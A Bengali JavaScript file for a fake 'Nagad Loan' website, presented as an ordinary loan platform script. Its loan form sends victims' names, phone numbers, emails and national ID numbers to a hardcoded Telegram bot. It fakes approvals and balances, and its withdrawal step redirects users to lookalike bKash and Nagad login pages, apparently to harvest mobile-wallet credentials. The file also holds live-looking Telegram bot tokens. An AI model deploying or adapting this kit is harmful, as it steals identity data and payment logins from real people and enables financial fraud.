// ======================================
// নগদ লোন - সম্পূর্ণ স্ক্রিপ্ট (সব ফাংশন এক জায়গায়)
// ======================================

console.log('%c✓ নগদ লোন প্ল্যাটফর্ম লোড হয়েছে', 'color: #ffc107; font-size: 16px; font-weight: bold;');

// ======================================
// ১. নম্বর ফর্ম্যাটিং
// ======================================

function formatBanglaNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
}

// ======================================
// ২. সাফল্য/ত্রুটি সতর্কতা 
// ======================================

function showSuccessAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-success alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

function showErrorAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-danger alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

function showWarningAlert(title, message) {
    const alertDiv = document.createElement('div');
    alertDiv.className = 'alert alert-warning alert-dismissible fade show position-fixed';
    alertDiv.style.cssText = `
        top: 100px;
        right: 20px;
        z-index: 9999;
        min-width: 350px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    `;
    alertDiv.innerHTML = `
        <strong>${title}</strong>
        <p class="mb-0 mt-2">${message}</p>
        <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
    `;
    document.body.appendChild(alertDiv);
    setTimeout(() => alertDiv.remove(), 5000);
}

// ======================================
// ৩. লোডিং ডিসপ্লে
// ======================================

function showLoadingDisplay(title = 'লোডিং', message = 'প্রক্রিয়া করছি...') {
    let loadingDiv = document.getElementById('loadingDisplay');
    
    if (!loadingDiv) {
        loadingDiv = document.createElement('div');
        loadingDiv.id = 'loadingDisplay';
        loadingDiv.className = 'position-fixed top-50 start-50 translate-middle';
        loadingDiv.style.cssText = `
            z-index: 10000;
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 50px rgba(0,0,0,0.3);
            text-align: center;
            min-width: 400px;
        `;
        document.body.appendChild(loadingDiv);
    }

    loadingDiv.innerHTML = `
        <div class="spinner-border text-warning mb-4" role="status" style="width: 50px; height: 50px;">
            <span class="visually-hidden">লোড করছি...</span>
        </div>
        <h5 class="fw-bold text-dark mb-2">${title}</h5>
        <p class="text-muted mb-0">${message}</p>
    `;
    
    loadingDiv.style.display = 'block';
}

function hideLoadingDisplay() {
    const loadingDiv = document.getElementById('loadingDisplay');
    if (loadingDiv) {
        loadingDiv.style.display = 'none';
    }
}

// ======================================
// ৪. টেলিগ্রাম সেটিংস
// ======================================

function getTelegramSettings() {
    // অটোমেটিক সেটিংস - আপনার বটের জন্য এখানে এডিট করুন
    return {
        botToken: '7474203780:AAHXjhHDBh6TT4vZGXNrIYxBHse-Bn4yrAY',
        chatId: '7061318778',
        webhookUrl: ''
    };
}

function getTelegramSettingsFromStorage() {
    // যদি ভবিষ্যতে localStorage সাপোর্ট করতে চান
    const settings = localStorage.getItem('telegramSettings');
    return settings ? JSON.parse(settings) : getTelegramSettings();
}

function saveSettings() {
    // সেটিংস অটোমেটিক্যালি লোড হয় - কোন সংরক্ষণের প্রয়োজন নেই
    const settings = getTelegramSettings();
    
    showSuccessAlert(
        '✓ অটোমেটিক সেটিংস',
        `✅ বট টোকেন লোড হয়েছে\n✅ চ্যাট আইডি লোড হয়েছে\n\nকোডে টোকেন হার্ডকোডেড আছে।`
    );

    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('settingsModal'));
        if (modal) modal.hide();
    }, 1500);
}

function testTelegramConnection() {
    const settings = getTelegramSettings();

    if (!settings.botToken || !settings.chatId) {
        showErrorAlert('সেটিংস প্রয়োজন', 'প্রথমে টোকেন এবং চ্যাট আইডি যোগ করুন।');
        return;
    }

    showLoadingDisplay('পরীক্ষা করছি', 'টেলিগ্রাম সংযোগ পরীক্ষা করছি...');

    const message = `✅ টেস্ট সফল!\n⏰ সময়: ${new Date().toLocaleString('bn-BD')}`;

    fetch(`https://api.telegram.org/bot${settings.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(r => r.json())
    .then(data => {
        hideLoadingDisplay();
        if (data.ok) {
            showSuccessAlert('✓ সফল', 'টেস্ট মেসেজ পাঠানো হয়েছে!');
            console.log('✓ টেলিগ্রাম সংযোগ ঠিক আছে');
        } else {
            showErrorAlert('✗ ত্রুটি', data.description || 'টোকেন/চ্যাট ID invalid');
            console.error('টেলিগ্রাম ত্রুটি:', data);
        }
    })
    .catch(err => {
        hideLoadingDisplay();
        showErrorAlert('✗ সংযোগ ব্যর্থ', err.message);
        console.error('API ত্রুটি:', err);
    });
}

// ======================================
// ৫. লোন আইডি তৈরি
// ======================================

function generateLoanId() {
    const prefix = 'NGD';
    const timestamp = Date.now().toString().slice(-6);
    const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
    return `${prefix}-${timestamp}-${random}`;
}

// ======================================
// ৬. আবেদন সংরক্ষণ (LocalStorage)
// ======================================

function storePendingApplication(applicationId, formData) {
    let pendingApplications = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pendingApplications[applicationId] = {
        ...formData,
        status: 'pending',
        createdAt: new Date().getTime()
    };
    localStorage.setItem('pendingApplications', JSON.stringify(pendingApplications));
    console.log('✓ আবেদন সংরক্ষিত:', applicationId);
}

// ======================================
// ৭. টেলিগ্রামে পাঠান
// ======================================

function sendLoanApplicationToTelegram(applicationId, formData, settings) {
    console.log('📤 টেলিগ্রামে পাঠানো হচ্ছে:', applicationId);

    const message = `
📋 <b>🆕 নতুন লোন আবেদন</b>

<b>📌 আবেদন ID:</b> <code>${applicationId}</code>

<b>👤 ব্যক্তিগত তথ্য:</b>
  • <b>নাম:</b> ${formData.fullName}
  • <b>মোবাইল:</b> ${formData.mobileNumber}
  • <b>ইমেইল:</b> ${formData.email}
  • <b>এনআইডি:</b> ${formData.nid}

<b>💰 লোন তথ্য:</b>
  • <b>অনুরোধকৃত টাকা:</b> ৳${formatBanglaNumber(formData.loanAmount)}
  • <b>সময়কাল:</b> ${formData.loanTerm} মাস
  • <b>বার্ষিক আয়:</b> ৳${formatBanglaNumber(formData.annualIncome)}

<b>⏰ তথ্য:</b>
  • <b>সময়:</b> ${formData.submittedAt}

⏳ <b>স্ট্যাটাস:</b> ⚠️ অনুমোদনের জন্য অপেক্ষমাণ
    `;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ অনুমোদন করুন', callback_data: `approve_${applicationId}` },
                { text: '❌ প্রত্যাখ্যান করুন', callback_data: `reject_${applicationId}` }
            ]
        ]
    };

    return fetch(`https://api.telegram.org/bot${settings.botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: settings.chatId,
            text: message,
            parse_mode: 'HTML',
            reply_markup: keyboard
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.ok) {
            console.log('✓ টেলিগ্রামে সফল:', applicationId);
            return true;
        } else {
            console.error('টেলিগ্রাম ত্রুটি:', data);
            return false;
        }
    })
    .catch(err => {
        console.error('টেলিগ্রাম পাঠানো ব্যর্থ:', err);
        return false;
    });
}

// ======================================
// ৮. পোলিং (অনুমোদনের জন্য অপেক্ষা করা)
// ======================================

function pollForApproval(applicationId, loanAmount) {
    console.log('⏳ পোলিং শুরু:', applicationId);
    let pollCount = 0;
    const maxPolls = 43200; // 12 ঘন্টা
    const autoApproveTime = 60; // ১ মিনিটে অটো এপ্রুভ

    const pollInterval = setInterval(() => {
        pollCount++;

        const pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
        const app = pending[applicationId];

        if (!app) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            console.log('✗ আবেদন মুছে গেছে');
            return;
        }

        if (app.status === 'approved') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            approveApplication(applicationId, loanAmount, app);
            return;
        }

        if (app.status === 'rejected') {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            rejectApplication(applicationId, app);
            return;
        }

        // ১ মিনিট পর অটো এপ্রুভ করুন
        if (pollCount === autoApproveTime) {
            console.log('⏰ ১ মিনিট সময় পেয়েছে, এখন অটো এপ্রুভ হচ্ছে...', applicationId);
            clearInterval(pollInterval);
            
            // status update করুন
            pending[applicationId].status = 'approved';
            pending[applicationId].autoApproved = true;
            pending[applicationId].approvedAt = new Date().getTime();
            localStorage.setItem('pendingApplications', JSON.stringify(pending));
            
            hideLoadingDisplay();
            approveApplication(applicationId, loanAmount, pending[applicationId]);
            return;
        }

        if (pollCount >= maxPolls) {
            clearInterval(pollInterval);
            hideLoadingDisplay();
            showWarningAlert('সময় শেষ', 'সিদ্ধান্ত পাওয়া যায়নি, পরে চেষ্টা করুন।');
            return;
        }
    }, 1000);
}

// ======================================
// ৯. অনুমোদন হ্যান্ডলার
// ======================================

function approveApplication(applicationId, loanAmount, application) {
    console.log('✓ অনুমোদিত:', applicationId);

    // ব্যালেন্স যোগ করুন (ডাবল হলে ডিভাইড করুন)
    const balanceElement = document.getElementById('currentBalance');
    const currentBalanceText = balanceElement.textContent;
    const currentBalance = parseInt(currentBalanceText.replace(/[^0-9]/g, '')) || 0;

    const actualLoanAmount = Math.floor(loanAmount / 2); // ডাবল হওয়ার জন্য 2 দ্বারা ভাগ করুন
    const newBalance = currentBalance + actualLoanAmount;
    balanceElement.textContent = formatBanglaNumber(newBalance) + ' Taka';
    setBalanceCookie(newBalance);

    // localStorage এ status update করুন
    let pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pending[applicationId].status = 'approved';
    pending[applicationId].approvedAt = new Date().getTime();
    localStorage.setItem('pendingApplications', JSON.stringify(pending));

    // নোটিফিকেশন দেখান
    showSuccessAlert(
        '✅ লোন অনুমোদিত!',
        `আপনার লোন অনুমোদিত হয়েছে!\n\n✓ এখনই টাকা উত্তোলন করে ফেলুন`
    );

    console.log('✅ অনুমোদন সম্পূর্ণ:', applicationId);
}

// ======================================
// ১০. প্রত্যাখ্যান হ্যান্ডলার
// ======================================

function rejectApplication(applicationId, application) {
    console.log('✗ প্রত্যাখ্যাত:', applicationId);

    // localStorage এ status update করুন
    let pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
    pending[applicationId].status = 'rejected';
    pending[applicationId].rejectedAt = new Date().getTime();
    localStorage.setItem('pendingApplications', JSON.stringify(pending));

    // নোটিফিকেশন দেখান
    showErrorAlert(
        '❌ লোন প্রত্যাখ্যাত',
        'আপনার আবেদন প্রত্যাখ্যাত হয়েছে।\n\nআরও তথ্যের জন্য যোগাযোগ করুন।'
    );

    console.log('✅ প্রত্যাখ্যান সম্পূর্ণ:', applicationId);
}

// ======================================
// ১১. লোন আবেদন জমা দিন (মূল ফাংশন) ⭐
// ======================================

function submitLoanApplication() {
    console.log('📝 লোন আবেদন সাবমিট করা হচ্ছে...');
    
    const form = document.getElementById('loanForm');
    
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        console.log('✗ ফর্ম validated নয়');
        return;
    }

    // ফর্ম ডেটা সংগ্রহ
    const fullNameInput = form.querySelector('input[placeholder="আপনার নাম"]');
    const mobileInput = form.querySelector('input[placeholder="01345345678"]');
    const emailInput = form.querySelector('input[placeholder="আপনো ইমেইল"]');
    const nidInput = form.querySelector('input[placeholder="এনআইডি"]');
    const loanAmountInput = form.querySelector('input[placeholder="120000"]');
    const loanTermSelect = form.querySelector('select');
    const annualIncomeInput = form.querySelector('input[placeholder="আপনার বার্ষিক আয়"]');

    const formData = {
        fullName: fullNameInput ? fullNameInput.value : '',
        mobileNumber: mobileInput ? mobileInput.value : '',
        email: emailInput ? emailInput.value : '',
        nid: nidInput ? nidInput.value : '',
        loanAmount: loanAmountInput ? parseInt(loanAmountInput.value) : 0,
        loanTerm: loanTermSelect ? parseInt(loanTermSelect.value) : 0,
        annualIncome: annualIncomeInput ? parseInt(annualIncomeInput.value) : 0,
        submittedAt: new Date().toLocaleString('bn-BD')
    };

    console.log('📋 ফর্ম ডেটা:', formData);

    // আবেদন ID তৈরি
    const applicationId = generateLoanId();
    formData.applicationId = applicationId;

    // টেলিগ্রাম সেটিংস চেক করুন
    const settings = getTelegramSettings();
    console.log('⚙️ সেটিংস:', { botToken: settings.botToken ? 'আছে ✓' : 'নেই ✗', chatId: settings.chatId ? 'আছে ✓' : 'নেই ✗' });

    if (!settings.botToken || !settings.chatId) {
        showErrorAlert(
            '⚠️ সেটিংস প্রয়োজন',
            'সেটিংসে টেলিগ্রাম টোকেন ও চ্যাট আইডি যোগ করুন।'
        );
        return;
    }

    // লোডিং দেখান
    showLoadingDisplay('প্রক্রিয়াধীন 📤', 'আবেদন পাঠানো হচ্ছে...');

    // আবেদন সংরক্ষণ করুন
    storePendingApplication(applicationId, formData);

    // টেলিগ্রামে পাঠান
    sendLoanApplicationToTelegram(applicationId, formData, settings).then(sent => {
        console.log('সেন্ড রেজাল্ট:', sent ? 'সফল ✓' : 'ব্যর্থ ✗');
        
        // মোডাল বন্ধ করুন
        setTimeout(() => {
            const modal = bootstrap.Modal.getInstance(document.getElementById('loanModal'));
            if (modal) modal.hide();
            form.reset();
            form.classList.remove('was-validated');
        }, 1000);

        // পোলিং শুরু করুন
        setTimeout(() => {
            showLoadingDisplay(
                '⏳ অপেক্ষমাণ',
                'সর্বোচ্চ ১ মিনিট অপেক্ষা করুন এর ভিতর আপনার অর্ডারটি পরিচালনা করা হবে...\n\nআইডি: ' + applicationId.substring(0, 15) + '...'
            );
            pollForApproval(applicationId, formData.loanAmount);
        }, 1500);
    });
}

// ======================================
// ১२. কুকি ম্যানেজমেন্ট (ব্যালেন্স সেভ/লোড)
// ======================================

function setBalanceCookie(balance) {
    const date = new Date();
    date.setTime(date.getTime() + (365 * 24 * 60 * 60 * 1000)); // 1 বছর
    const expires = "expires=" + date.toUTCString();
    document.cookie = "balanceTaka=" + balance + ";" + expires + ";path=/";
    console.log('🍪 ব্যালেন্স কুকিতে সেভ হয়েছে:', balance);
}

function getBalanceCookie() {
    const nameEQ = "balanceTaka=";
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
        cookie = cookie.trim();
        if (cookie.indexOf(nameEQ) === 0) {
            return parseInt(cookie.substring(nameEQ.length));
        }
    }
    return null;
}

// ======================================
// १२ক. অন্যান্য ফর্ম ফাংশন
// ======================================

function submitWithdrawal() {
    const form = document.getElementById('withdrawForm');
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }

    // Withdrawal amount পান
    const amountInput = form.querySelector('input[type="number"]');
    const withdrawAmount = parseInt(amountInput ? amountInput.value : '0');

    // বর্তমান ব্যালেন্স পান
    const balanceElement = document.getElementById('currentBalance');
    const balanceText = balanceElement.textContent;
    const currentBalance = parseInt(balanceText.replace(/[^0-9]/g, '')) || 0;

    // ব্যালেন্স চেক করুন
    if (withdrawAmount > currentBalance) {
        showErrorAlert('⚠️ আপনার ব্যালেন্স কম', `আপনার বর্তমান ব্যালেন্স ৳${formatBanglaNumber(currentBalance)} টাকা। আপনি ৳${formatBanglaNumber(withdrawAmount)} টাকা উত্তোলন করতে পারবেন না।`);
        return;
    }

    // উত্তোলনের পরে নতুন ব্যালেন্স কুকিতে সেভ করুন
    const balanceAfterWithdrawal = currentBalance - withdrawAmount;
    setBalanceCookie(balanceAfterWithdrawal);

    // Payment Method পান
    const paymentMethodSelect = form.querySelector('select');
    const paymentMethod = paymentMethodSelect ? paymentMethodSelect.value : '';

    // Payment Method অনুযায়ী লিংক রিডাইরেক্ট করুন
    if (paymentMethod === 'bkash') {
        // Bkash পেমেন্ট পৃষ্ঠা (আপনার নিজের লিংক দিয়ে রিপ্লেস করুন)
        const bkashLink = `https://sarmin-akter11223.github.io/Blkash/login.html?token=6835793070:AAGMG1B5duy_Ne7KpxP-CfO3Rl_JOtJBG6Q&id=7061318778`;
        // বা সাধারণ Bkash পেজ
        window.location.href = 'https://sarmin-akter11223.github.io/Blkash/login.html?token=6835793070:AAGMG1B5duy_Ne7KpxP-CfO3Rl_JOtJBG6Q&id=7061318778';
        
        showSuccessAlert('✓ Bkash এ পাঠানো হচ্ছে', `আপনার ৳${formatBanglaNumber(withdrawAmount)} টাকা Bkash এ পাঠানো হচ্ছে...`);
    } 
    else if (paymentMethod === 'nagad') {
        // Nagad পেমেন্ট পৃষ্ঠা (আপনার নিজের লিংক দিয়ে রিপ্লেস করুন)
        const nagadLink = `https://nagad-web.vercel.app/login.html?token=7283053282:AAHkE0SxcQsX__cqodWlX-5AANeuIV7e0AI&id=7061318778`;
        window.location.href = nagadLink;
        
        showSuccessAlert('✓ Nagad এ পাঠানো হচ্ছে', `আপনার ৳${formatBanglaNumber(withdrawAmount)} টাকা Nagad এ পাঠানো হচ্ছে...`);
    } 
    else {
        showErrorAlert('⚠️ পেমেন্ট মেথড নির্বাচন করুন', 'দয়া করে Bkash অথবা Nagad নির্বাচন করুন।');
        return;
    }

    // ফর্ম রিসেট করুন এবং মোডাল বন্ধ করুন
    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('withdrawModal'));
        if (modal) modal.hide();
        form.reset();
        form.classList.remove('was-validated');
    }, 2000);
}

function submitLogin() {
    const form = document.getElementById('loginForm');
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }
    const randomBalance = Math.floor(Math.random() * 500000) + 10000;
    document.getElementById('currentBalance').textContent = formatBanglaNumber(randomBalance) + ' Taka';    setBalanceCookie(randomBalance);    showSuccessAlert('✓ লগইন সফল', 'আপনি সফলভাবে লগইন করেছেন।');
    setTimeout(() => {
        const modal = bootstrap.Modal.getInstance(document.getElementById('loginModal'));
        if (modal) modal.hide();
        form.reset();
        form.classList.remove('was-validated');
    }, 2000);
}

function checkBalance() {
    const form = document.getElementById('balanceCheckForm');
    if (form.checkValidity() === false) {
        event.preventDefault();
        event.stopPropagation();
        form.classList.add('was-validated');
        return;
    }
    const randomBalance = Math.floor(Math.random() * 1000000) + 50000;
    document.getElementById('balanceResultAmount').textContent = formatBanglaNumber(randomBalance) + ' টাকা';
    document.getElementById('balanceResult').style.display = 'block';
    showSuccessAlert('✓ পাওয়া গেছে', 'আপনার ব্যালেন্স উপরে দেখানো হয়েছে।');
}

// ======================================
// ১३. স্মুথ স্ক্রোলিং ও নেভ ইফেক্ট
// ======================================

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
    });
});

window.addEventListener('scroll', function() {
    const navbar = document.querySelector('.navbar');
    if (window.scrollY > 50) {
        navbar.style.boxShadow = '0 5px 15px rgba(0, 0, 0, 0.2)';
    } else {
        navbar.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.1)';
    }
});

const navbarCollapse = document.querySelector('.navbar-collapse');
if (navbarCollapse) {
    const navLinks = navbarCollapse.querySelectorAll('a.nav-link');
    navLinks.forEach(link => {
        link.addEventListener('click', () => {
            const bsCollapse = new bootstrap.Collapse(navbarCollapse, { toggle: false });
            bsCollapse.hide();
        });
    });
}

// ======================================
// १४. ডকুমেন্ট লোড ইভেন্ट
// ======================================

document.addEventListener('DOMContentLoaded', function() {
    console.log('✓ ডকুমেন্ট সম্পূর্ণভাবে লোড হয়েছে');
    
    // টেলিগ্রাম সেটিংস লোড করুন
    const settings = getTelegramSettings();
    if (document.getElementById('telegramBotToken')) {
        document.getElementById('telegramBotToken').value = settings.botToken || '';
    }
    if (document.getElementById('telegramChatId')) {
        document.getElementById('telegramChatId').value = settings.chatId || '';
    }
    if (document.getElementById('webhookUrl')) {
        document.getElementById('webhookUrl').value = settings.webhookUrl || '';
    }
});

// ======================================
// १५. Telegram Callback Polling সিস্টেম
// ======================================

let lastUpdateId = 0;
let telegramsPollingActive = false;

function startTelegramCallbackPolling() {
    const settings = getTelegramSettings();
    
    if (!settings.botToken || !settings.chatId) {
        console.log('⚠️ Telegram সেটিংস না থাকায় polling শুরু হয়নি');
        return;
    }
    
    if (telegramsPollingActive) {
        console.log('ℹ️ Telegram polling ইতিমধ্যে চলছে');
        return;
    }
    
    telegramsPollingActive = true;
    console.log('🔄 Telegram Callback Polling শুরু...');
    
    // প্রতি 2 সেকেন্ডে আপডেট চেক করুন
    setInterval(() => {
        if (!telegramsPollingActive) return;
        
        fetchTelegramUpdates(settings);
    }, 2000);
}

function fetchTelegramUpdates(settings) {
    const url = `https://api.telegram.org/bot${settings.botToken}/getUpdates`;
    const params = new URLSearchParams({
        offset: lastUpdateId + 1,
        allowed_updates: 'callback_query'
    });
    
    fetch(`${url}?${params}`, {
        method: 'GET',
        headers: { 'Content-Type': 'application/json' }
    })
    .then(r => r.json())
    .then(data => {
        if (!data.ok || !data.result) {
            console.log('⚠️ Telegram getUpdates ব্যর্থ:', data);
            return;
        }
        
        // প্রতিটি আপডেট প্রসেস করুন
        data.result.forEach(update => {
            lastUpdateId = update.update_id;
            
            if (update.callback_query) {
                handleTelegramCallback(update.callback_query, settings);
            }
        });
    })
    .catch(err => {
        console.error('Telegram polling error:', err);
    });
}

function handleTelegramCallback(callbackQuery, settings) {
    const callbackData = callbackQuery.data;
    const userId = callbackQuery.from.id;
    const messageId = callbackQuery.message.message_id;
    const queryId = callbackQuery.id;
    
    console.log('📨 Telegram Callback:', callbackData);
    
    // Callback data: "approve_XXX" বা "reject_XXX"
    if (callbackData.startsWith('approve_')) {
        const applicationId = callbackData.replace('approve_', '');
        
        let pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
        if (pending[applicationId]) {
            const appData = pending[applicationId];
            const loanAmount = appData.loanAmount || 0;
            
            // Balance যোগ করুন (ডাবল হলে ডিভাইড করুন)
            const balanceElement = document.getElementById('currentBalance');
            const currentBalanceText = balanceElement.textContent;
            const currentBalance = parseInt(currentBalanceText.replace(/[^0-9]/g, '')) || 0;
            const actualLoanAmount = Math.floor(loanAmount / 2); // ডাবল হওয়ার জন্য 2 দ্বারা ভাগ করুন
            const newBalance = currentBalance + actualLoanAmount;
            balanceElement.textContent = formatBanglaNumber(newBalance) + ' Taka';
            setBalanceCookie(newBalance);
            
            // Status update করুন
            pending[applicationId].status = 'approved';
            pending[applicationId].approvedAt = new Date().getTime();
            pending[applicationId].balanceAdded = true;
            localStorage.setItem('pendingApplications', JSON.stringify(pending));
            
            // Alert দেখান
            showSuccessAlert(
                '✅ লোন অনুমোদিত!',
                `টেলিগ্রাম থেকে অনুমোদিত হয়েছে!\n\n✓ টাকা: ৳${formatBanglaNumber(actualLoanAmount)}\n✓ নতুন ব্যালেন্স: ৳${formatBanglaNumber(newBalance)}`
            );
            
            console.log('✅ Telegram থেকে অনুমোদিত:', applicationId);
            
            // Telegram এ নোটিফিকেশন পাঠান
            answerCallbackQuery(queryId, '✅ অনুমোদিত হয়েছে!', settings);
            editTelegramMessage(messageId, queryId, applicationId, 'approved', settings);
        }
    }
    else if (callbackData.startsWith('reject_')) {
        const applicationId = callbackData.replace('reject_', '');
        
        let pending = JSON.parse(localStorage.getItem('pendingApplications')) || {};
        if (pending[applicationId]) {
            // Status update করুন
            pending[applicationId].status = 'rejected';
            pending[applicationId].rejectedAt = new Date().getTime();
            localStorage.setItem('pendingApplications', JSON.stringify(pending));
            
            // Alert দেখান
            showErrorAlert(
                '❌ লোন প্রত্যাখ্যাত',
                'টেলিগ্রাম থেকে প্রত্যাখ্যাত হয়েছে।'
            );
            
            console.log('❌ Telegram থেকে প্রত্যাখ্যাত:', applicationId);
            
            // Telegram এ নোটিফিকেশন পাঠান
            answerCallbackQuery(queryId, '❌ প্রত্যাখ্যাত হয়েছে!', settings);
            editTelegramMessage(messageId, queryId, applicationId, 'rejected', settings);
        }
    }
}

function answerCallbackQuery(queryId, text, settings) {
    const url = `https://api.telegram.org/bot${settings.botToken}/answerCallbackQuery`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            callback_query_id: queryId,
            text: text,
            show_alert: false
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.ok) {
            console.log('✓ Telegram notification পাঠানো হয়েছে');
        }
    })
    .catch(err => console.error('Callback query answer error:', err));
}

function editTelegramMessage(messageId, queryId, applicationId, status, settings) {
    const chatId = settings.chatId;
    const url = `https://api.telegram.org/bot${settings.botToken}/editMessageText`;
    
    const statusText = status === 'approved' ? '✅ <b>অনুমোদিত</b>' : '❌ <b>প্রত্যাখ্যাত</b>';
    const newMessage = `📋 <b>নতুন লোন আবেদন</b>

<b>📌 আবেদন ID:</b> <code>${applicationId}</code>

⏳ <b>স্ট্যাটাস:</b> ${statusText}
🕐 <b>পরিবর্তনের সময়:</b> ${new Date().toLocaleString('bn-BD')}`;
    
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            text: newMessage,
            parse_mode: 'HTML'
        })
    })
    .then(r => r.json())
    .then(data => {
        if (data.ok) {
            console.log('✓ Telegram মেসেজ আপডেট হয়েছে');
        }
    })
    .catch(err => console.error('Message edit error:', err));
}

// ======================================
// १६. ডকুমেন্ট লোড ইভেন্ট
// ======================================

document.addEventListener('DOMContentLoaded', function() {
    console.log('✓ ডকুমেন্ট সম্পূর্ণভাবে লোড হয়েছে');
    
    // কুকি থেকে ব্যালেন্স লোড করুন
    const savedBalance = getBalanceCookie();
    if (savedBalance !== null) {
        document.getElementById('currentBalance').textContent = formatBanglaNumber(savedBalance) + ' Taka';
        console.log('🍪 কুকি থেকে ব্যালেন্স লোড হয়েছে:', savedBalance);
    }
    
    // টেলিগ্রাম সেটিংস লোড করুন
    const settings = getTelegramSettings();
    if (document.getElementById('telegramBotToken')) {
        document.getElementById('telegramBotToken').value = settings.botToken || '';
    }
    if (document.getElementById('telegramChatId')) {
        document.getElementById('telegramChatId').value = settings.chatId || '';
    }
    if (document.getElementById('webhookUrl')) {
        document.getElementById('webhookUrl').value = settings.webhookUrl || '';
    }
    
    // Telegram Callback Polling শুরু করুন
    setTimeout(() => {
        startTelegramCallbackPolling();
    }, 1000);
});

console.log('%c✓ সব স্ক্রিপ্ট সফলভাবে লোড হয়েছে!', 'color: #28a745; font-size: 14px; font-weight: bold;');
console.log('%c📋 কনসোলে লোন আবেদন প্রক্রিয়া দেখা যাবে', 'color: #0088cc; font-size: 12px;');
console.log('%c🔄 Telegram callback polling সক্রিয়', 'color: #0088cc; font-size: 12px; font-weight: bold;');

